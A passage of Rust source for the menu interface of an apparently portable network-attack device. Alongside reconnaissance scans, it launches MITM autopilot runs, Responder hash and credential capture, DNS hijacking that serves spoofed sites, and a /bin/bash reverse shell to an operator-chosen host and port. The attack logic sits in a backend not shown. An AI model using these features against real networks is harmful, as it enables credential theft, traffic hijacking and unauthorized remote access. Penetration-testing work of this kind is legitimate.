        let mut wifi = Vec::new();
        if let Some(arr) = data.get("wifi_modules").and_then(|v| v.as_array()) {
            for item in arr {
                if let Ok(info) = serde_json::from_value::<InterfaceSummary>(item.clone()) {
                    wifi.push(info.name);
                }
            }
        }

        if wifi.is_empty() {
            self.show_message("WiFi", ["No wireless interfaces found"])?;
            return Ok(None);
        }

        wifi.sort();
        wifi.dedup();

        // Auto-select if only one
        if wifi.len() == 1 {
            return Ok(Some(wifi[0].clone()));
        }

        // Build labels with active marker
        let active = self.config.settings.active_network_interface.clone();
        let labels: Vec<String> = wifi
            .iter()
            .map(|n| {
                if !active.is_empty() && *n == active {
                    format!("* {}", n)
                } else {
                    n.clone()
                }
            })
            .collect();

        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| wifi[idx].clone()))
    }

    fn toggle_discord(&mut self) -> Result<()> {
        self.config.settings.discord_enabled = !self.config.settings.discord_enabled;
        self.save_config()?;
        // No message needed as the menu label will update immediately
        Ok(())
    }

    fn show_hardware_detect(&mut self) -> Result<()> {
        self.show_progress("Hardware Scan", ["Detecting interfaces...", "Please wait"])?;

        match self
            .core
            .dispatch(Commands::Hardware(HardwareCommand::Detect))
        {
            Ok((_, data)) => {
                let eth_count = data
                    .get("ethernet_count")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                let wifi_count = data.get("wifi_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let other_count = data
                    .get("other_count")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);

                let ethernet_ports = data
                    .get("ethernet_ports")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();
                let wifi_modules = data
                    .get("wifi_modules")
                    .and_then(|v| v.as_array())
                    .cloned()
                    .unwrap_or_default();

                // Build list of detected interfaces (clickable)
                let mut all_interfaces = Vec::new();
                let mut labels = Vec::new();

                let active_interface = self.config.settings.active_network_interface.clone();

                for port in &ethernet_ports {
                    if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("* {}", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(port.clone());
                    }
                }
                for module in &wifi_modules {
                    if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("* {}", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(module.clone());
                    }
                }

                // If nothing to show, just present summary
                if all_interfaces.is_empty() {
                    let summary_lines = vec![
                        format!("Ethernet: {}", eth_count),
                        format!("WiFi: {}", wifi_count),
                        format!("Other: {}", other_count),
                    ];
                    self.show_message(
                        "Hardware Detected",
                        summary_lines.iter().map(|s| s.as_str()),
                    )?;
                } else {
                    // Present clickable list and show details on selection
                    loop {
                        let Some(idx) = self.choose_from_menu("Detected interfaces", &labels)?
                        else {
                            break;
                        };

                        let info = &all_interfaces[idx];
                        let interface_name = info
                            .get("name")
                            .and_then(|v| v.as_str())
                            .unwrap_or("unknown")
                            .to_string();

                        // Build detail lines
                        let mut details = Vec::new();
                        details.push(format!("Name: {}", interface_name));
                        if let Some(kind) = info.get("kind").and_then(|v| v.as_str()) {
                            details.push(format!("Kind: {}", kind));
                        }
                        if let Some(state) = info.get("oper_state").and_then(|v| v.as_str()) {
                            details.push(format!("State: {}", state));
                        }
                        if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) {
                            details.push(format!("IP: {}", ip));
                        }
                        details.push("".to_string());
                        details.push("[OK] Set Active".to_string());

                        self.display.draw_menu(
                            "Interface details",
                            &details,
                            usize::MAX,
                            &self.stats.snapshot(),
                        )?;
                        // Wait for action
                        loop {
                            let btn = self.buttons.wait_for_press()?;
                            match self.map_button(btn) {
                                ButtonAction::Select => {
                                    // Set this interface as active
                                    self.config.settings.active_network_interface =
                                        interface_name.clone();
                                    let config_path = self.root.join("gui_conf.json");
                                    let mut lines = vec![format!("Set to: {}", interface_name)];

                                    if let Err(e) = self.config.save(&config_path) {
                                        self.show_message(
                                            "Error",
                                            [format!("Failed to save: {}", e)],
                                        )?;
                                    } else {
                                        if let Err(e) = self.apply_interface_isolation(
                                            &[interface_name.clone()],
                                        ) {
                                            lines.push(format!("Isolation failed: {}", e));
                                        }
                                        if let Some(route_msg) =
                                            self.ensure_route_for_interface(&interface_name)?
                                        {
                                            lines.push(route_msg);
                                        }
                                        self.show_message(
                                            "Active Interface",
                                            lines.iter().map(|s| s.as_str()),
                                        )?;
                                    }
                                    // Refresh the labels to show new active indicator
                                    labels.clear();
                                    all_interfaces.clear();
                                    let active =
                                        self.config.settings.active_network_interface.clone();
                                    for port in &ethernet_ports {
                                        if let Some(name) =
                                            port.get("name").and_then(|v| v.as_str())
                                        {
                                            let label = if name == active {
                                                format!("* {}", name)
                                            } else {
                                                name.to_string()
                                            };
                                            labels.push(label);
                                            all_interfaces.push(port.clone());
                                        }
                                    }
                                    for module in &wifi_modules {
                                        if let Some(name) =
                                            module.get("name").and_then(|v| v.as_str())
                                        {
                                            let label = if name == active {
                                                format!("* {}", name)
                                            } else {
                                                name.to_string()
                                            };
                                            labels.push(label);
                                            all_interfaces.push(module.clone());
                                        }
                                    }
                                    break;
                                }
                                ButtonAction::Back => break,
                                ButtonAction::MainMenu => {
                                    self.menu_state.home();
                                    break;
                                }
                                ButtonAction::Reboot => {
                                    self.confirm_reboot()?;
                                }
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(err) => {
                let msg = vec![format!("Scan failed: {}", err)];
                self.show_message("Hardware Error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }

    fn start_autopilot(&mut self, mode: AutopilotMode) -> Result<()> {
        // Block noisy modes if user has selected Stealth operation mode
        if self
            .config
            .settings
            .operation_mode
            .eq_ignore_ascii_case("stealth")
            && !matches!(mode, AutopilotMode::Stealth)
        {
            return self.show_message(
                "Autopilot",
                [
                    "Stealth mode active.",
                    "Switch mode or run",
                    "Stealth autopilot only.",
                ],
            );
        }

        let active_interface = self.config.settings.active_network_interface.clone();
        if active_interface.is_empty() {
            return self.show_message(
                "Autopilot",
                [
                    "No active interface set",
                    "",
                    "Run Hardware Detect and",
                    "select an Ethernet iface.",
                ],
            );
        }

        if !self.is_ethernet_interface(&active_interface) {
            return self.show_message(
                "Autopilot",
                [
                    &format!("Interface: {}", active_interface),
                    "Autopilot requires",
                    "a wired (Ethernet)",
                    "connection with link.",
                ],
            );
        }

        if !self.interface_has_carrier(&active_interface) {
            return self.show_message(
                "Autopilot",
                [
                    &format!("Interface: {}", active_interface),
                    "Ethernet link is down.",
                    "Plug in a cable and retry.",
                ],
            );
        }

        // Refuse to start if already running
        if let Ok((_, data)) = self
            .core
            .dispatch(Commands::Autopilot(AutopilotCommand::Status))
        {
            if data
                .get("running")
                .and_then(|v| v.as_bool())
                .unwrap_or(false)
            {
                let mode_text = data
                    .get("mode")
                    .and_then(|v| v.as_str())
                    .unwrap_or("unknown");
                let mut lines = Vec::new();
                lines.push("Already running.".to_string());
                lines.push(format!("Mode: {}", mode_text));
                lines.push("".to_string());
                lines.push("Stop it first, then".to_string());
                lines.push("start a new run.".to_string());
                return self.show_message(
                    "Autopilot",
                    lines.iter().map(|s| s.as_str()),
                );
            }
        }

        // Optional DNS spoof site
        let dns_sites = self.list_dnsspoof_sites();
        let mut dns_choice: Option<String> = None;
        if !dns_sites.is_empty() {
            let mut labels = vec!["No DNS spoof".to_string()];
            labels.extend(dns_sites.iter().cloned());
            if let Some(idx) = self.choose_from_menu("DNS Spoof (optional)", &labels)? {
                if idx > 0 {
                    dns_choice = dns_sites.get(idx - 1).cloned();
                }
            } else {
                return Ok(()); // cancelled
            }
        }

        let mode_label = Self::autopilot_mode_label(mode);
        let confirm_lines = vec![
            format!("Mode: {}", mode_label),
            format!("Interface: {}", active_interface),
            format!(
                "DNS spoof: {}",
                dns_choice.as_deref().unwrap_or("None")
            ),
            "".to_string(),
            "Start autopilot?".to_string(),
        ];
        self.show_message(
            "Autopilot",
            confirm_lines.iter().map(|s| s.as_str()),
        )?;
        let confirm = self.choose_from_list(
            "Confirm",
            &["Start".to_string(), "Cancel".to_string()],
        )?;
        if confirm != Some(0) {
            return Ok(());
        }

        // Apply identity hardening if enabled
        self.apply_identity_hardening();

        self.show_progress(
            "Autopilot",
            [
                &format!("Starting {}", mode_label),
                &format!("Interface: {}", active_interface),
            ],
        )?;

        let args = AutopilotStartArgs {
            mode,
            interface: Some(active_interface.clone()),
            scan: true,
            mitm: true,
            responder: true,
            dns_spoof: dns_choice.clone(),
            duration: 0,
            check_interval: 30,
        };

        match self
            .core
            .dispatch(Commands::Autopilot(AutopilotCommand::Start(args)))
        {
            Ok((msg, _data)) => {
                let mut lines = Vec::new();
                lines.push(msg);
                lines.push(format!("Mode: {}", mode_label));
                lines.push(format!("Iface: {}", active_interface));
                lines.push(format!(
                    "DNS spoof: {}",
                    dns_choice.as_deref().unwrap_or("None")
                ));
                lines.push("".to_string());
                lines.push("Toolbar shows AP status.".to_string());
                self.show_message(
                    "Autopilot",
                    lines.iter().map(|s| s.as_str()),
                )
            }
            Err(e) => self.show_message("Autopilot", [format!("Start failed: {}", e)]),
        }
    }

    fn stop_autopilot(&mut self) -> Result<()> {
        match self.core.dispatch(Commands::Autopilot(AutopilotCommand::Stop)) {
            Ok((msg, _)) => self.show_message("Autopilot", [msg]),
            Err(e) => self.show_message("Autopilot", [format!("Stop failed: {}", e)]),
        }
    }

    fn start_responder(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("Responder")? else {
            return Ok(());
        };

        self.show_message(
            "Responder",
            [
                "Listens on this network",
                "for LLMNR/NBT/MDNS and",
                "captures hashes/creds.",
                "",
                "Press Start to launch.",
                "Stop via Responder Off.",
            ],
        )?;
        let confirm = self.choose_from_list("Start Responder?", &["Start".to_string(), "Cancel".to_string()])?;
        if confirm != Some(0) {
            return Ok(());
        }

        let args = ResponderArgs {
            interface: Some(iface.clone()),
        };
        match self
            .core
            .dispatch(Commands::Responder(ResponderCommand::On(args)))
        {
            Ok((msg, _)) => self.show_message(
                "Responder",
                [msg, format!("Interface: {}", iface), "Loot: Responder/logs".to_string()],
            ),
            Err(e) => self.show_message("Responder", [format!("Start failed: {}", e)]),
        }
    }

    fn stop_responder(&mut self) -> Result<()> {
        match self.core.dispatch(Commands::Responder(ResponderCommand::Off)) {
            Ok((msg, _)) => self.show_message("Responder", [msg]),
            Err(e) => self.show_message("Responder", [format!("Stop failed: {}", e)]),
        }
    }

    fn recon_gateway(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconCommand, WifiReconGatewayArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Gateway Info", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Gateway Info")? else {
                return Ok(());
            };

            self.show_message(
                "Gateway Info",
                [
                    "Discover network gateway,",
                    "DNS servers, and DHCP",
                    "server information.",
                    "",
                    &format!("Interface: {}", iface),
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Discovery?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Gateway Discovery",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Querying network info...",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconGatewayArgs {
                interface: Some(iface.clone()),
            };

            match self.dispatch_cancellable(
                "Gateway Discovery",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::Gateway(args))),
                10,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["Gateway Discovery".to_string(), "".to_string()];
                    lines.push(format!("Interface: {}", iface));
                    lines.push("".to_string());

                    if let Some(gw) = data.get("default_gateway").and_then(|v| v.as_str()) {
                        lines.push(format!("Gateway: {}", gw));
                    } else {
                        lines.push("Gateway: Not found".to_string());
                    }

                    if let Some(dns) = data.get("dns_servers").and_then(|v| v.as_array()) {
                        if !dns.is_empty() {
                            lines.push("DNS Servers:".to_string());
                            for server in dns.iter().take(3) {
                                if let Some(s) = server.as_str() {
                                    lines.push(format!("  {}", s));
                                }
                            }
                        }
                    }

                    if let Some(dhcp) = data.get("dhcp_server").and_then(|v| v.as_str()) {
                        lines.push(format!("DHCP: {}", dhcp));
                    }

                    self.scrollable_text_viewer("Gateway Info", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn recon_arp_scan(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconArpScanArgs, WifiReconCommand};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("ARP Scan", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("ARP Scan")? else {
                return Ok(());
            };

            if !interface_has_ip(&iface) {
                return self.show_message(
                    "ARP Scan",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before scanning.",
                    ],
                );
            }

            self.show_message(
                "ARP Scan",
                [
                    "Discover all devices on",
                    "the local subnet using",
                    "ARP requests.",
                    "",
                    &format!("Interface: {}", iface),
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start ARP Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "ARP Scan",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Scanning local network...",
                    "This may take 30 seconds",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconArpScanArgs {
                interface: iface.clone(),
            };

            match self.dispatch_cancellable(
                "ARP Scan",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::ArpScan(args))),
                40,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["Local Network Devices".to_string(), "".to_string()];

                    if let Some(devices) = data.get("devices").and_then(|d| d.as_array()) {
                        if devices.is_empty() {
                            lines.push("No devices found".to_string());
                        } else {
                            for device in devices {
                                if let Some(ip) = device.get("ip").and_then(|v| v.as_str()) {
                                    lines.push(format!("{}", ip));
                                    if let Some(mac) = device.get("mac").and_then(|v| v.as_str()) {
                                        lines.push(format!("  MAC: {}", mac));
                                    }
                                    if let Some(hostname) =
                                        device.get("hostname").and_then(|v| v.as_str())
                                    {
                                        lines.push(format!("  Host: {}", hostname));
                                    }
                                    if let Some(vendor) =
                                        device.get("vendor").and_then(|v| v.as_str())
                                    {
                                        let short_vendor = shorten_for_display(vendor, 18);
                                        lines.push(format!("  {}", short_vendor));
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Total: {} device(s)",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("ARP Scan Results", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn recon_service_scan(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconCommand, WifiReconServiceScanArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Service Scan", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Service Scan")? else {
                return Ok(());
            };

            if !interface_has_ip(&iface) {
                return self.show_message(
                    "Service Scan",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before scanning.",
                    ],
                );
            }

            self.show_message(
                "Service Scan",
                [
                    "Scan common network",
                    "services (HTTP, SSH, SMB)",
                    "on discovered devices.",
                    "",
                    "This may take 60+ seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Service Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Service Scan",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Discovering devices...",
                    "Then scanning services...",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconServiceScanArgs {
                interface: iface.clone(),
            };

            match self.dispatch_cancellable(
                "Service Scan",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::ServiceScan(args))),
                120,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["Network Services".to_string(), "".to_string()];

                    if let Some(results) = data.get("results").and_then(|r| r.as_array()) {
                        if results.is_empty() {
                            lines.push("No services found".to_string());
                        } else {
                            for host in results {
                                if let Some(ip) = host.get("ip").and_then(|v| v.as_str()) {
                                    lines.push(format!("{}", ip));
                                    if let Some(services) =
                                        host.get("services").and_then(|s| s.as_array())
                                    {
                                        for svc in services {
                                            if let (Some(port), Some(name)) = (
                                                svc.get("port").and_then(|p| p.as_u64()),
                                                svc.get("service").and_then(|s| s.as_str()),
                                            ) {
                                                lines.push(format!("  {}: {}", port, name));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Hosts: {}",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("Service Scan", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn recon_mdns_scan(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconCommand, WifiReconMdnsScanArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("mDNS Discovery", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(_iface) = self.require_connected_wireless("mDNS Discovery")? else {
                return Ok(());
            };

            self.show_message(
                "mDNS Discovery",
                [
                    "Discover mDNS/Bonjour",
                    "devices (printers, smart",
                    "devices, Apple devices).",
                    "",
                    "Duration: 10 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start mDNS Scan?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "mDNS Discovery",
                [
                    "Listening for mDNS",
                    "announcements...",
                    "",
                    "Duration: 10 seconds",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconMdnsScanArgs { duration: 10 };

            match self.dispatch_cancellable(
                "mDNS Discovery",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::MdnsScan(args))),
                15,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["mDNS/Bonjour Devices".to_string(), "".to_string()];

                    if let Some(devices) = data.get("devices").and_then(|d| d.as_array()) {
                        if devices.is_empty() {
                            lines.push("No mDNS devices found".to_string());
                            lines.push("".to_string());
                            lines.push("Note: Requires avahi".to_string());
                            lines.push("Install: apt install".to_string());
                            lines.push("avahi-utils".to_string());
                        } else {
                            for device in devices {
                                if let (Some(name), Some(ip)) = (
                                    device.get("name").and_then(|v| v.as_str()),
                                    device.get("ip").and_then(|v| v.as_str()),
                                ) {
                                    let short_name = shorten_for_display(name, 20);
                                    lines.push(format!("{}", short_name));
                                    lines.push(format!("  IP: {}", ip));
                                    if let Some(services) =
                                        device.get("services").and_then(|s| s.as_array())
                                    {
                                        for svc in services.iter().take(2) {
                                            if let Some(svc_str) = svc.as_str() {
                                                let short_svc = shorten_for_display(svc_str, 18);
                                                lines.push(format!("  {}", short_svc));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                }
                            }
                        }
                    }

                    lines.push(format!(
                        "Total: {} device(s)",
                        data.get("count").and_then(|c| c.as_u64()).unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("mDNS Discovery", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn recon_bandwidth(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconBandwidthArgs, WifiReconCommand};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("Bandwidth Monitor", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("Bandwidth Monitor")? else {
                return Ok(());
            };

            if !interface_has_ip(&iface) {
                return self.show_message(
                    "Bandwidth Monitor",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before monitoring.",
                    ],
                );
            }

            self.show_message(
                "Bandwidth Monitor",
                [
                    "Monitor real-time upload",
                    "and download bandwidth",
                    "usage on the interface.",
                    "",
                    &format!("Interface: {}", iface),
                    "Duration: 10 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start Monitoring?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "Bandwidth Monitor",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Monitoring traffic...",
                    "Duration: 10 seconds",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconBandwidthArgs {
                interface: iface.clone(),
                duration: 10,
            };

            match self.dispatch_cancellable(
                "Bandwidth Monitor",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::Bandwidth(args))),
                15,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["Bandwidth Monitor".to_string(), "".to_string()];
                    lines.push(format!("Interface: {}", iface));
                    lines.push("".to_string());

                    if let Some(rx_mbps) = data.get("rx_mbps").and_then(|v| v.as_f64()) {
                        lines.push(format!("Download: {:.2} Mbps", rx_mbps));
                    }
                    if let Some(tx_mbps) = data.get("tx_mbps").and_then(|v| v.as_f64()) {
                        lines.push(format!("Upload: {:.2} Mbps", tx_mbps));
                    }
                    lines.push("".to_string());
                    if let Some(rx_bytes) = data.get("rx_bytes").and_then(|v| v.as_u64()) {
                        lines.push(format!("RX: {} bytes", rx_bytes));
                    }
                    if let Some(tx_bytes) = data.get("tx_bytes").and_then(|v| v.as_u64()) {
                        lines.push(format!("TX: {} bytes", tx_bytes));
                    }
                    lines.push("".to_string());
                    lines.push(format!(
                        "Duration: {}s",
                        data.get("duration_secs")
                            .and_then(|d| d.as_u64())
                            .unwrap_or(0)
                    ));

                    self.scrollable_text_viewer("Bandwidth Results", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn recon_dns_capture(&mut self) -> Result<()> {
        use rustyjack_core::cli::{WifiReconCommand, WifiReconDnsCaptureArgs};

        #[cfg(not(target_os = "linux"))]
        {
            return self.show_message("DNS Capture", ["Available on Linux targets only"]);
        }

        #[cfg(target_os = "linux")]
        {
            let Some(iface) = self.require_connected_wireless("DNS Capture")? else {
                return Ok(());
            };

            if !interface_has_ip(&iface) {
                return self.show_message(
                    "DNS Capture",
                    [
                        &format!("Interface: {}", iface),
                        "No IP address assigned",
                        "",
                        "Connect to a network",
                        "before capturing.",
                    ],
                );
            }

            self.show_message(
                "DNS Capture",
                [
                    "Passively capture DNS",
                    "queries on the network",
                    "using tcpdump.",
                    "",
                    &format!("Interface: {}", iface),
                    "Duration: 30 seconds",
                    "",
                    "Press SELECT to start",
                ],
            )?;

            let confirm = self.choose_from_list(
                "Start DNS Capture?",
                &["Start".to_string(), "Cancel".to_string()],
            )?;
            if confirm != Some(0) {
                return Ok(());
            }

            self.show_progress(
                "DNS Capture",
                [
                    &format!("Interface: {}", iface),
                    "",
                    "Capturing DNS queries...",
                    "Duration: 30 seconds",
                    "",
                    "Press Back to cancel",
                ],
            )?;

            let args = WifiReconDnsCaptureArgs {
                interface: iface.clone(),
                duration: 30,
            };

            match self.dispatch_cancellable(
                "DNS Capture",
                Commands::Wifi(WifiCommand::Recon(WifiReconCommand::DnsCapture(args))),
                40,
            )? {
                Some((msg, data)) => {
                    let mut lines = vec!["DNS Query Capture".to_string(), "".to_string()];

                    if let Some(queries) = data.get("queries").and_then(|q| q.as_array()) {
                        if queries.is_empty() {
                            lines.push("No DNS queries captured".to_string());
                            lines.push("".to_string());
                            lines.push("Note: Requires tcpdump".to_string());
                        } else {
                            lines.push("Captured Domains:".to_string());
                            lines.push("".to_string());
                            for query in queries.iter().take(50) {
                                if let Some(domain) =
                                    query.get("domain").and_then(|d| d.as_str())
                                {
                                    let short_domain = shorten_for_display(domain, 20);
                                    if let Some(qtype) =
                                        query.get("type").and_then(|t| t.as_str())
                                    {
                                        lines.push(format!("{} ({})", short_domain, qtype));
                                    } else {
                                        lines.push(short_domain);
                                    }
                                }
                            }
                        }
                    }

                    lines.push("".to_string());
                    let total = data.get("count").and_then(|c| c.as_u64()).unwrap_or(0);
                    lines.push(format!("Total: {} queries", total));
                    if total > 50 {
                        lines.push("(showing first 50)".to_string());
                    }

                    self.scrollable_text_viewer("DNS Capture", &lines, false)
                }
                None => Ok(()),
            }
        }
    }

    fn start_dns_spoof(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("DNS Spoof")? else {
            return Ok(());
        };

        let sites = self.list_dnsspoof_sites();
        if sites.is_empty() {
            return self.show_message(
                "DNS Spoof",
                [
                    "No site templates found.",
                    "Add folders under",
                    "DNSSpoof/sites/<name>",
                ],
            );
        }
        let choice = self.choose_dnsspoof_site(&sites)?;
        let Some(site) = choice else { return Ok(()); };

        self.show_message(
            "DNS Spoof",
            [
                "Hijacks DNS on this WLAN",
                "and serves the selected",
                "site/captive portal.",
                "",
                "Press Start to launch.",
                "Stop via Stop DNS Spoof.",
            ],
        )?;
        let confirm = self.choose_from_list("Start DNS Spoof?", &["Start".to_string(), "Cancel".to_string()])?;
        if confirm != Some(0) {
            return Ok(());
        }

        let args = DnsSpoofStartArgs {
            site: site.clone(),
            interface: Some(iface.clone()),
            loot_dir: None,
        };

        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Start(args)))
        {
            Ok((msg, _)) => self.show_message(
                "DNS Spoof",
                [
                    msg,
                    format!("Site: {}", site),
                    format!("Interface: {}", iface),
                ],
            ),
            Err(e) => self.show_message("DNS Spoof", [format!("Start failed: {}", e)]),
        }
    }

    fn stop_dns_spoof(&mut self) -> Result<()> {
        match self
            .core
            .dispatch(Commands::DnsSpoof(DnsSpoofCommand::Stop))
        {
            Ok((msg, _)) => self.show_message("DNS Spoof", [msg]),
            Err(e) => self.show_message("DNS Spoof", [format!("Stop failed: {}", e)]),
        }
    }

    fn launch_reverse_shell(&mut self) -> Result<()> {
        let Some(iface) = self.require_connected_wireless("Reverse Shell")? else {
            return Ok(());
        };

        self.show_message(
            "Reverse Shell",
            [
                "Connects back to a host",
                "with /bin/bash via TCP.",
                "",
                "Ensure listener is ready.",
                "Press Start to continue.",
            ],
        )?;
        let cont = self.choose_from_list("Launch shell?", &["Start".to_string(), "Cancel".to_string()])?;
        if cont != Some(0) {
            return Ok(());
        }

        // Prompt for target IP octets
        let mut octets = Vec::new();
        for i in 0..4 {
            let prefix = match i {
                0 => "Target",
                1 => "Target",
                2 => "Target",
                _ => "Target",
            };
            let part = self.prompt_octet(prefix)?;
            let Some(val) = part else { return Ok(()); };
            octets.push(val);
        }
        let target_ip = format!(
            "{}.{}.{}.{}",
            octets[0], octets[1], octets[2], octets[3]
        );

        // Prompt for port (common choices)
        let ports = vec!["4444", "9001", "1337", "5555"];
        let port_choice = self.choose_from_list("LPORT", &ports.iter().map(|s| s.to_string()).collect::<Vec<_>>())?;
        let port: u16 = port_choice
            .and_then(|idx| ports.get(idx))
            .and_then(|p| p.parse().ok())
            .unwrap_or(4444);

        let args = ReverseLaunchArgs {
            target: target_ip.clone(),
            port,
            shell: "/bin/bash".to_string(),
            interface: Some(iface.clone()),
        };

        match self
            .core
            .dispatch(Commands::Reverse(ReverseCommand::Launch(args)))
        {
            Ok((msg, _)) => self.show_message(
                "Reverse Shell",
                [
                    msg,
                    format!("Target: {}", target_ip),
                    format!("Port: {}", port),
                    format!("Iface: {}", iface),
                ],
            ),
            Err(e) => self.show_message("Reverse Shell", [format!("Launch failed: {}", e)]),
        }
    }


    fn show_autopilot_status(&mut self) -> Result<()> {
        match self
            .core
            .dispatch(Commands::Autopilot(AutopilotCommand::Status))
        {
            Ok((_msg, data)) => {
                let running = data
                    .get("running")
                    .and_then(|v| v.as_bool())
                    .unwrap_or(false);
                let mode = data
                    .get("mode")
                    .and_then(|v| v.as_str())
                    .unwrap_or("none");
                let phase = data
                    .get("phase")
                    .and_then(|v| v.as_str())
                    .unwrap_or("idle");
                let elapsed = data
                    .get("elapsed_secs")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                let hosts = data
                    .get("hosts_found")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                let creds = data
                    .get("credentials_captured")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);
                let packets = data
                    .get("packets_captured")
                    .and_then(|v| v.as_u64())
                    .unwrap_or(0);

                let mut lines = vec![
                    format!("Running: {}", if running { "YES" } else { "NO" }),
                    format!("Mode: {}", mode),
                    format!("Phase: {}", phase),
                    format!("Elapsed: {}s", elapsed),
                    format!("Hosts: {}", hosts),
                    format!("Creds: {}", creds),
                    format!("Packets: {}", packets),
                ];

                if let Some(errs) = data.get("errors").and_then(|v| v.as_array()) {
                    if !errs.is_empty() {
                        lines.push("Errors:".to_string());
                        for err in errs.iter().take(3) {
                            if let Some(e) = err.as_str() {
                                lines.push(shorten_for_display(e, 18));
                            }
                        }
                        if errs.len() > 3 {
                            lines.push(format!("+{} more", errs.len() - 3));
                        }
                    }
                }

                lines.push("".to_string());
                lines.push("Select=Close".to_string());
                lines.push("Back=Close".to_string());

                self.show_message("Autopilot", lines.iter().map(|s| s.as_str()))
            }
            Err(e) => self.show_message("Autopilot", [format!("Status error: {}", e)]),
        }
    }

    fn scan_wifi_networks(&mut self) -> Result<()> {
        if !self.mode_allows_active("Wi-Fi scanning disabled in Stealth")? {
            return Ok(());
        }
        self.show_progress("WiFi Scan", ["Scanning for networks...", "Please wait"])?;

